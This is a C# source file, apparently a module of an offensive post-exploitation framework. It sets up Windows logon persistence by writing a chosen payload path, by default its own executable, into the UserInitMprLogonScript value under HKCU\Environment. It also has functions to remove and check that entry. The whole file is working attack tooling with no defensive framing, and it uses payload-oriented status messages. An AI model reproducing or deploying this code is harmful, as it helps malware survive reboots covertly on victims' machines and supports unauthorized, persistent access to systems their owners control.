using System;
using Microsoft.Win32;

namespace Framework.Modules
{
    public static class Worker
    {
        private const string RegPath = @"Environment";
        private const string ValueName = "UserInitMprLogonScript";

        private static string GetDefaultPayloadPath()
        {
            try
            {
                return System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            }
            catch
            {
                return @"C:\Windows\System32\cmd.exe";
            }
        }

        public static string Info(string[] args)
        {
            string defaultPayload = GetDefaultPayloadPath();

            return $"[i] Default Start Command Parameters:\n" +
                   $"    R2 logon_scripts Start {defaultPayload}";
        }

        public static string Start(string[] args)
        {
            string payloadPath = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : GetDefaultPayloadPath();

            try
            {
                using var regKey = Registry.CurrentUser.OpenSubKey(RegPath, writable: true)
                                  ?? Registry.CurrentUser.CreateSubKey(RegPath, writable: true);

                if (regKey == null)
                    return "[-] Failed to open or create HKCU\\Environment registry key.";

                var existing = regKey.GetValue(ValueName);
                if (existing != null)
                {
                    string existingStr = existing.ToString() ?? string.Empty;
                    if (existingStr.Equals(payloadPath, StringComparison.OrdinalIgnoreCase))
                        return $"[*] Logon script payload '{payloadPath}' is already registered.";

                    return $"[*] A logon script is already configured with value: '{existingStr}'";
                }

                regKey.SetValue(ValueName, payloadPath, RegistryValueKind.String);
                return $"[+] Successfully registered user logon script payload -> '{payloadPath}'";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied modifying HKCU\\Environment registry key.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during logon script installation: {ex.Message}";
            }
        }

        public static string Stop(string[] args)
        {
            try
            {
                using var regKey = Registry.CurrentUser.OpenSubKey(RegPath, writable: true);
                if (regKey == null)
                    return "[-] HKCU\\Environment registry key not found.";

                var existing = regKey.GetValue(ValueName);
                if (existing == null)
                    return "[*] No registered user logon script found to remove.";

                regKey.DeleteValue(ValueName, throwOnMissingValue: false);
                return "[+] Successfully removed the UserInitMprLogonScript registry entry.";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied modifying HKCU\\Environment registry key.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during logon script removal: {ex.Message}";
            }
        }

        public static string Check(string[] args)
        {
            try
            {
                using var regKey = Registry.CurrentUser.OpenSubKey(RegPath, writable: false);
                if (regKey == null)
                    return "[-] HKCU\\Environment registry key not found.";

                var value = regKey.GetValue(ValueName)?.ToString();
                if (string.IsNullOrEmpty(value))
                    return "[*] No user logon script is currently configured.";

                return $"[+] Verified user logon script -> '{value}'";
            }
            catch (Exception ex)
            {
                return $"[-] Error during verification: {ex.Message}";
            }
        }
    }
}